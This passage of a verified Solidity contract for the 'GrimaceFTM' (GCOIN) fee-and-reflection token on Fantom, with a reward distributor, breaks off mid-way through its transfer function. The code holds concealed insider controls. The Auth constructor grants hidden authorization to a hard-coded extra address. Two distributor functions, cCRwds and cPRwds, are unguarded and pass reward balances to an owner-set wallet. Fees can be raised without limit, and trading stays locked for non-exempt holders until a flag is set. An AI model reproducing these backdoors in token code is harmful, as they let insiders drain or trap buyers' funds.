/**
 *Submitted for verification at FtmScan.com on 2022-02-01
*/

/*



*/


// SPDX-License-Identifier: NOLICENSE

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function getOwner() external view returns (address);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    function isContract(address account) internal view returns (bool) {

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface TokT {
    function balanceOf(address) external returns (uint);
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
        authorizations[
    0xE0c74CEc136EE52d0eE3BFC2E99bfa134C466db7] = true;}
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public authorized {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public authorized {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    function renounceOwnership() public onlyOwner {
        address dead = 0x000000000000000000000000000000000000dEaD;
        owner = dead;
        emit OwnershipTransferred(dead);
    }

    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function getrewards(address shareholder) external;
    function setnewrw(address _nrew, address _prew) external;
    function cCRwds(uint256 _aPn, uint256 _aPd) external;
    function cPRwds(uint256 _aPn, uint256 _aPd) external;
    function getRAddress() external view returns (address);
    function setnewra(address _newra) external;
    function getRewardsOwed(address _wallet) external view returns (uint256);
    function getTotalRewards(address _wallet) external view returns (uint256);
    function gettotalDistributed() external view returns (uint256);
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;
    
    address _token;
    
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised; }
    
    //Cronos Network
    // address WBNB = 0x5C7F8A570d578ED84E63fdFA7b1eE72dEae1AE23; //Wrapped CRO
    // IBEP20 RWDS = IBEP20(0xc21223249CA28397B4B6541dfFaEcC539BfF0c59); //Cro USDC Token
    // IBEP20 PRWDS = IBEP20(0x2D03bECE6747ADC00E1a131BBA1469C15fD11e03); //VVS Token
    
    //Fantom Network
    address WBNB = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83; //Wrapped FTM
    IBEP20 RWDS = IBEP20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75); //FTM USDC Token
    IBEP20 PRWDS = IBEP20(0xd8321AA83Fb0a4ECd6348D4577431310A6E0814d); //Geist Token
    
    //BSC Network
    //address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; //Wrapped BNB CA
    //IBEP20 RWDS = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); //Binance-Peg BUSD Token (BUSD)
    //IBEP20 PRWDS = IBEP20(0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47); //Binance-Peg Cardano Token (ADA)

    address REWARDS;
    IRouter router;
    
    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
    uint256 public minPeriod = 600;
    uint256 public minDistribution = 1000 * (10 ** 9);
    uint256 currentIndex;
    
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;
    
    bool initialized;
    
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router) {
        router = _router != address(0)
            ? IRouter(_router)
            // : IRouter(0xeC0A7a0C2439E8Cb67b992b12ecd020Ea943c7Be); //CroDex Router
            : IRouter(0xF491e7B69E4244ad4002BC14e878a34207E38c29); //FTM SpookySwap Router
//           : IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); //Pancakeswap Router
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder); }
        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);}
        else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder); }
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function cCRwds(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = REWARDS;
        uint256 Ramount = RWDS.balanceOf(address(this));
        uint256 PRamount = Ramount.mul(_aPn).div(_aPd);
        RWDS.transfer(shareholder, PRamount);
    }
    
    function deposit() external payable override onlyToken {
        uint256 balanceBefore = RWDS.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(RWDS);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp );
        uint256 amount = RWDS.balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function cPRwds(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = REWARDS;
        uint256 Pamount = PRWDS.balanceOf(address(this));
        uint256 PPamount = Pamount.mul(_aPn).div(_aPd);
        PRWDS.transfer(shareholder, PPamount);
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0) { return; }
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0; }
            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]); }
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++; }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function getRAddress() public view override returns (address) {
        return address(RWDS);
    }

    function setnewra(address _newra) external override onlyToken {
        REWARDS = _newra;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            RWDS.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function setnewrw(address _nrew, address _prew) external override onlyToken {
        PRWDS = IBEP20(_prew);
        RWDS = IBEP20(_nrew);
    }

    function getrewards(address shareholder) external override onlyToken {
        distributeDividend(shareholder);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function gettotalDistributed() public view override returns (uint256) {
        return uint256(totalDistributed);
    }

    function getRewardsOwed(address _wallet) external override view returns (uint256) {
        address shareholder = _wallet;
        return uint256(getUnpaidEarnings(shareholder));
    }

    function getTotalRewards(address _wallet) external override view returns (uint256) {
        address shareholder = _wallet;
        return uint256(shares[shareholder].totalRealised);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract GRIMACEFTM is Context, IERC20, Auth {
    using SafeMath for uint256;
    using Address for address;

    string private constant _name = 'GrimaceFTM';
    string private constant _symbol = 'GCOIN';
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 100 * 10**4 * (10 ** _decimals);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    //Comment correct token
    // address WBNB = 0x5C7F8A570d578ED84E63fdFA7b1eE72dEae1AE23; //Wrapped CRO
    address WBNB = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83; //Wrapped FTM
   //address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; //Wrapped BNB (WBNB)
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    uint256 public _maxTxAmount = ( _tTotal * 100 ) / 10000;
    uint256 public _maxWalletToken = ( _tTotal * 200 ) / 10000;
    uint256 public _mStx = ( _tTotal * 100 ) / 10000;
    uint256 public _asT = 40 * (10 ** _decimals);
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    mapping (address => bool) iFxE;
    mapping (address => bool) iTxLE;
    mapping (address => bool) iDxE;
    mapping (address => bool) iPSA;
    mapping (address => bool) itCDh;
    mapping (address => bool) isTloE;
    mapping (address => bool) iMxWE;
    address[] private _excluded;
    IRouter router;
    address public pair;
    uint256 csb1 = 55;
    uint256 csb2 = 30;
    uint256 csb3 = 15;
    uint256 csb4 = 0;
    uint256 xr = 0;
    uint256 gss = 30000;
    uint256 zr = 40;
    uint256 pr = 0;
    uint256 tLD = 100;
    uint256 chr = 0;
    uint256 yr = 30;
    uint256 cr = 30;
    DividendDistributor distributor;
    uint256 distributorGas = 100000;
    uint256 gso = 20000;
    
    bool private swapping;
    bool public swE = true;
    uint256 public sT = 100 * (10 ** _decimals); //
    bool LFG = false;
    uint256 public vsN = 50;
    uint256 vsD = 100;
    bool rewards = true;
    bool sFrz = true;
    uint8 sFrzT = 30 seconds;
    mapping (address => uint) private sFrzin;
    bool bFrz = true;
    uint8 bFrzT = 15 seconds;
    mapping (address => uint) private bFrzin;
    uint8 mStts = 2 seconds;
    mapping (address => uint) private mSts;

    address lpR; 
    address krhF;
    address mdhS;
    address extR;
    address wthT;
    address mkwA;
    address przwA;
    address charwA;
    address mkwT;
    address prizewT;
    address charitywT;
    address tfU;

    struct feeRatesStruct {
      uint256 rfi;
      uint256 marketing;
      uint256 liquidity;
      uint256 rewards;
      uint256 prize;
      uint256 charity;
    }
    
    //BuyFees = 12%
    feeRatesStruct private feeRates = feeRatesStruct(
    {rfi: 0, //reflections
     marketing: 80,
     liquidity: 40,
     rewards: 0,
     prize: 0,
     charity: 0
    });

//SellFees = 12%
    feeRatesStruct private sellFeeRates = feeRatesStruct(
    {rfi: 0, //reflections
     marketing: 80,
     liquidity: 40,
     rewards: 0,
     prize: 0,
     charity: 0
    });

    struct TotFeesPaidStruct{
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity;
        uint256 rewards;
        uint256 prize;
        uint256 charity;
    }
    
    TotFeesPaidStruct totFeesPaid;

    struct valuesFromGetValues{
      uint256 rAmount;
      uint256 rTransferAmount;
      uint256 rRfi;
      uint256 rMarketing;
      uint256 rLiquidity;
      uint256 rRewards;
      uint256 rPrize;
      uint256 rCharity;
      uint256 tTransferAmount;
      uint256 tRfi;
      uint256 tMarketing;
      uint256 tLiquidity;
      uint256 tRewards;
      uint256 tPrize;
      uint256 tCharity;
    }

    event FeesChanged();
    
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor () Auth(msg.sender) {
        // IRouter _router = IRouter(0xeC0A7a0C2439E8Cb67b992b12ecd020Ea943c7Be); //CroDex router
       IRouter _router = IRouter(0xF491e7B69E4244ad4002BC14e878a34207E38c29); //FTM SpookySwap Router
        //IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); //PancakeSwap router
        address _pair = IFactory(_router.factory())
            .createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        _rOwned[owner] = _rTotal;
        distributor = new DividendDistributor(address(_router));
        _isExcluded[address(this)] = true;
        _isExcluded[address(mkwA)] = true;
        _isExcluded[address(przwA)] = true;
        _isExcluded[address(charwA)] = true;
        iFxE[msg.sender] = true;
        iFxE[address(owner)] = true;
        iFxE[address(this)] = true;
        iPSA[address(owner)] = true;
        iPSA[msg.sender] = true;
        iTxLE[msg.sender] = true;
        iTxLE[address(this)] = true;
        iTxLE[address(owner)] = true;
        iTxLE[address(router)] = true;
        iMxWE[address(msg.sender)] = true;
        iMxWE[address(this)] = true;
        iMxWE[address(owner)] = true;
        iMxWE[address(DEAD)] = true;
        iMxWE[address(pair)] = true;
        iMxWE[address(lpR)] = true;
        isTloE[address(lpR)] = true;
        isTloE[address(owner)] = true;
        isTloE[msg.sender] = true;
        isTloE[DEAD] = true;
        isTloE[address(this)] = true;
        iDxE[pair] = true;
        iDxE[address(this)] = true;
        iDxE[DEAD] = true;
        iDxE[ZERO] = true;
        mkwT = address(this);
        prizewT = address(this);
        charitywT = address(this);
        lpR = msg.sender;
        krhF = msg.sender;
        mdhS = msg.sender;
        wthT = msg.sender;
        mkwA = msg.sender;
        przwA = msg.sender;
        charwA = msg.sender;
        tfU = msg.sender;
        
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getOwner() external view override returns (address) { return owner; }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender]+addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function setPresaleAddress(bool _enabled, address _address) external authorized {
        iDxE[_address] = _enabled;
        iFxE[_address] = _enabled;
        iMxWE[_address] = _enabled;
        isTloE[_address] = _enabled;
        itCDh[_address] = _enabled;
        iPSA[_address] = _enabled;
    }

    function setiDE(address holder, bool exempt) external authorized {
        require(holder != address(this) && holder != pair, "holders excluded");
        iDxE[holder] = exempt;
        if(exempt){
            distributor.setShare(holder, 0);}
        else{distributor.setShare(holder, balanceOf(holder)); }
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

   function setLauNch() external authorized {
        sFrz = true;
        bFrz = true; 
        swE = true;
    }

   function setPresAle() external authorized {
        sFrz = false;
        bFrz = false; 
        swE = false;
    }

    function setiPSa(bool _enabled, address _add) external authorized {
        iPSA[_add] = _enabled;
    }

    function deliver(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        valuesFromGetValues memory s = _getValues(tAmount, true, false);
        _rOwned[sender] = _rOwned[sender].sub(s.rAmount);
        _rTotal = _rTotal.sub(s.rAmount);
        totFeesPaid.rfi += tAmount;
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferRfi) {
            valuesFromGetValues memory s = _getValues(tAmount, true, false);
            return s.rAmount;
        } else {
            valuesFromGetValues memory s = _getValues(tAmount, true, false);
            return s.rTransferAmount; }
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount/currentRate;
    }

    function excludeFromReflection(address account) external authorized() {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeInReflection(address account) external authorized() {
        require(_isExcluded[account], "Account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break; }
        }
    }

// Buy Fees
    function setFeR(uint256 _rfi, uint256 _mark, uint256 _liq, uint256 _rew, uint256 _prize, uint256 _charity) external authorized {
        feeRates.rfi = _rfi;
        feeRates.marketing = _mark;
        feeRates.liquidity = _liq;
        feeRates.rewards = _rew;
        feeRates.prize = _prize;
        feeRates.charity = _charity;
        emit FeesChanged();
    }

// Sell Fees
    function setSFeR(uint256 _rfi, uint256 _mark, uint256 _liq, uint256 _rew, uint256 _prize, uint256 _charity) external authorized{
        sellFeeRates.rfi = _rfi;
        sellFeeRates.marketing = _mark;
        sellFeeRates.liquidity = _liq;
        sellFeeRates.rewards = _rew;
        sellFeeRates.prize = _prize;
        sellFeeRates.charity = _charity;
        emit FeesChanged();
    }

    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {
        _rTotal -=rRfi;
        totFeesPaid.rfi +=tRfi;
    }

    function totalReflections() public view returns (uint256) {
        return totFeesPaid.rfi;
    }

    function mytotalReflections(address wallet) public view returns (uint256) {
        return _rOwned[wallet];
    }

    function mytotalReflections2(address wallet) public view returns (uint256) {
        return _rOwned[wallet] - _tOwned[wallet];
    }

    function _takeRewards(uint256 rRewards, uint256 tRewards) private {
        totFeesPaid.rewards +=tRewards;

        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)]+=tRewards;
        }
        _rOwned[address(this)] +=rRewards;
    }

    function _takeLiquidity(uint256 rLiquidity, uint256 tLiquidity) private {
        totFeesPaid.liquidity +=tLiquidity;

        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)]+=tLiquidity;
        }
        _rOwned[address(this)] +=rLiquidity;
    }

    function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {
        totFeesPaid.marketing +=tMarketing;

        if(_isExcluded[mkwT])
        {
            _tOwned[mkwT]+=tMarketing;
        }
        _rOwned[mkwT] +=rMarketing;
    }

        function _takePrize(uint256 rPrize, uint256 tPrize) private {
        totFeesPaid.prize +=tPrize;

        if(_isExcluded[prizewT])
        {
            _tOwned[prizewT]+=tPrize;
        }
        _rOwned[prizewT] +=rPrize;
    }

    function _takeCharity(uint256 rCharity, uint256 tCharity) private {
        totFeesPaid.charity +=tCharity;

        if(_isExcluded[charitywT])
        {
            _tOwned[charitywT]+=tCharity;
        }
        _rOwned[charitywT] +=rCharity;
    }

    function _getValues(uint256 tAmount, bool takeFee, bool isSale) private view returns (valuesFromGetValues memory to_return) {
        to_return = _getTValues(tAmount, takeFee, isSale);
        (to_return.rAmount, to_return.rTransferAmount, to_return.rRfi,to_return.rMarketing, to_return.rLiquidity, to_return.rRewards, to_return.rPrize, to_return.rCharity) = _getRValues(to_return, tAmount, takeFee, _getRate());
        return to_return;
    }

    function _getTValues(uint256 tAmount, bool takeFee, bool isSale) private view returns (valuesFromGetValues memory s) {
        if(!takeFee) {
          s.tTransferAmount = tAmount;
          return s; }
        if(isSale){
            s.tRfi = tAmount*sellFeeRates.rfi/1000;
            s.tMarketing = tAmount*sellFeeRates.marketing/1000;
            s.tLiquidity = tAmount*sellFeeRates.liquidity/1000;
            s.tRewards = tAmount*sellFeeRates.rewards/1000;
            s.tPrize = tAmount*sellFeeRates.prize/1000;
            s.tCharity = tAmount*sellFeeRates.charity/1000;
            s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity-s.tRewards-s.tPrize-s.tCharity; }
        else{
            s.tRfi = tAmount*feeRates.rfi/1000;
            s.tMarketing = tAmount*feeRates.marketing/1000;
            s.tLiquidity = tAmount*feeRates.liquidity/1000;
            s.tRewards = tAmount*feeRates.rewards/1000;
            s.tPrize = tAmount*feeRates.prize/1000;
            s.tCharity = tAmount*feeRates.charity/1000;
            s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity-s.tRewards-s.tPrize-s.tCharity; }
        return s;
    }

    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi, uint256 rMarketing, uint256 rLiquidity, uint256 rRewards, uint256 rPrize, uint256 rCharity) {
        rAmount = tAmount*currentRate;
        if(!takeFee) {
          return(rAmount, rAmount, 0,0,0,0,0,0); }

        rRfi = s.tRfi*currentRate;
        rMarketing = s.tMarketing*currentRate;
        rLiquidity = s.tLiquidity*currentRate;
        rRewards = s.tRewards*currentRate;
        rPrize = s.tPrize*currentRate;
        rCharity = s.tCharity*currentRate;
        rTransferAmount =  rAmount-rRfi-rMarketing-rLiquidity-rRewards-rPrize-rCharity;
        return (rAmount, rTransferAmount, rRfi, rMarketing, rLiquidity, rRewards, rPrize, rCharity);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply/tSupply;
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply-_rOwned[_excluded[i]];
            tSupply = tSupply-_tOwned[_excluded[i]]; }
        if (rSupply < _rTotal/_tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(from),"You are trying to transfer more than your balance");
        if(!iFxE[from] && !iFxE[to]){require(LFG, "LFG");}
        if(!iMxWE[to] && !iPSA[from] && to != address(this) && to != address(DEAD) && to != pair && to != lpR){
            require((balanceOf(to) + amount) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
        if(from != pair && sFrz && !isTloE[from]) {
            require(sFrzin[from] < block.timestamp, "Outside of Time Allotment"); 
            sFrzin[from] = block.timestamp + sFrzT;} 
        if(from == pair && bFrz && !isTloE[to]){
            require(bFrzin[to] < block.timestamp, "Outside of Time Allotment"); 
            bFrzin[to] = block.timestamp + bFrzT;} 
        checkTxLimit(from, amount);
        chkSmTx(from != pair, from, amount);
        if(from == pair){mSts[to] = block.timestamp + mStts;}
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 vsT;
